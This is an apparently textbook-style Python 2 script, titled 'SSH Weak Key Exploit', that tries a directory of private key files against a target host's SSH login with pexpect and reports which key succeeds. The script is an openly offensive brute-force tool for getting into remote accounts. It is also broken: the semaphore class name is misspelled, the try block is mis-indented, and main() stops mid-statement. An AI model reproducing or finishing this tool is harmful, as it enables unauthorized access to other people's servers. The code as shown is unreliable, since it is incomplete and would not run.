#!/usr/bin/env python
import pexpect, optparse, os
from threading import *

maxConnections = 5
connection_lock = BoundSemapohre(value=maxConnections)
Stop = False
Fails = 0

usage = "Example: bruteKey.py -H <target> -u <user name> -d <directory> "

def banner():
	print "##### SSH Weak Key Exploit  #######"
	usage
	print""

def connect(user, host, keyfile, release):
	global Stop
	global Fails
	try:
		perm_denied = 'Permission denied'
		ssh_newkey = 'Are you sure you wan tto continue'
		conn_closed = 'Connection closed by remote host'
		opt = ' -o PasswordAuthentication=no'
		connStr = 'ssh '+user+'@'+host+' -i'+keyfile+opt
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
	if ret == 2:
		print '[-] Adding Host to ~/.ssh/known_hosts'
		child.sendline('yes')
		connect(user, host, keyfile, False)
	elif ret == 3:
		print '[-] Connection Closed By Remote Host'
		Fails += 1
	elif ret > 3:
		print '[+] Success. '+str(keyfile)
		Stop = True
	finally:
		if release:
			connection_lock.release()

def main():
	parser = optparse.OptionParser('usage%prog -H '+'target host -u <user> -d <directory>')
	parser.






if __name__ == '__main__':
	main()